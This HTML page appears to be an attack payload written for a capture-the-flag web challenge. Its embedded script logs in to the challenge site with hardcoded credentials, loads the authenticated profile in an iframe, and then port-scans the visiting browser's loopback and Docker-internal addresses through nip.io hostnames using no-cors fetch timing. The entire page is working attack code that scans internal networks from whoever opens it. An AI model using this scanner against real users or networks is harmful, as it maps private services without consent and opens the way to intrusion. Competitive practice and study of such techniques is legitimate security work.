<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="robots" content="noindex,nofollow">
<title>probe</title>
<style>
  body{background:#fff;color:#000;font:13px/1.4 monospace;padding:12px;margin:0}
  table{border-collapse:collapse;width:100%}
  td,th{border:1px solid #ccc;padding:2px 6px;text-align:left;font-size:12px}
  .open{color:#0a0;font-weight:bold}
  .closed{color:#999}
  .err{color:#c00}
  iframe{width:100%;height:420px;border:1px solid #333;margin-top:8px}
  h3{margin:14px 0 4px}
</style>
</head>
<body>
<div id="status">starting…</div>
<table id="results"><thead><tr><th>target</th><th>result</th><th>ms</th></tr></thead><tbody></tbody></table>
<h3>self profile (post-login, same-origin iframe)</h3>
<iframe id="profileFrame"></iframe>

<script>
const SITE = 'https://spaceship.web.2026.sunshinectf.games';
const statusEl = document.getElementById('status');
const tbody = document.querySelector('#results tbody');

function row(target, result, ms, cls) {
  const tr = document.createElement('tr');
  tr.innerHTML = `<td>${target}</td><td class="${cls}">${result}</td><td>${ms}</td>`;
  tbody.appendChild(tr);
}

async function probe(url) {
  const t0 = performance.now();
  try {
    // no-cors: we can't read the body, but the promise resolving vs rejecting
    // tells us whether a TCP connection + HTTP response happened at all.
    await fetch(url, { mode: 'no-cors', cache: 'no-store', signal: AbortSignal.timeout(2500) });
    row(url, 'responded (open)', (performance.now() - t0).toFixed(0), 'open');
  } catch (e) {
    row(url, 'no response / refused', (performance.now() - t0).toFixed(0), 'closed');
  }
}

async function main() {
  statusEl.textContent = 'logging in as solver1 on ' + SITE + ' …';
  try {
    await fetch(SITE + '/login', {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'include',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'username=solver1&password=solver1pass',
    });
  } catch (e) {
    statusEl.textContent = 'login fetch error: ' + e;
  }

  statusEl.textContent = 'login attempted, loading authenticated profile via iframe…';
  document.getElementById('profileFrame').src = SITE + '/profile';

  statusEl.textContent = 'probing internal targets…';

  const targets = [];
  const loopbackPorts = [21,22,23,25,53,80,110,111,143,443,445,465,587,631,993,995,
    1025,1080,1194,1433,1521,1723,2049,2181,2375,2376,2379,2380,3000,3001,3128,
    3306,3389,4000,4040,4369,4443,4444,5000,5001,5432,5555,5601,5672,5900,5984,
    6000,6379,6443,7000,7001,7077,7474,7777,8000,8001,8008,8080,8081,8082,8086,
    8088,8090,8161,8200,8443,8500,8529,8888,8889,9000,9001,9042,9090,9092,9100,
    9200,9300,9418,9999,10000,10250,10255,11211,15672,15692,16379,27017,27018,
    27019,28015,50000,50070];
  for (const p of loopbackPorts) targets.push(`http://127.0.0.1.nip.io:${p}/`);

  const gateways = ['172.17.0.1','172.18.0.1','172.19.0.1','172.20.0.1','172.21.0.1',
    '172.22.0.1','172.23.0.1','172.24.0.1','172.25.0.1'];
  for (const g of gateways) {
    for (const p of [80,443,3000,8080]) targets.push(`http://${g}.nip.io:${p}/`);
  }
  const subnets = ['172.18.0','172.19.0','172.20.0'];
  for (const s of subnets) {
    for (let h = 2; h <= 6; h++) {
      for (const p of [80,443,3000]) targets.push(`http://${s}.${h}.nip.io:${p}/`);
    }
  }

  statusEl.textContent = `probing ${targets.length} targets (parallel, 2.5s timeout each)…`;
  await Promise.all(targets.map(probe));
  statusEl.textContent = `done — ${targets.length} targets probed.`;
}

main();
</script>
</body>
</html>
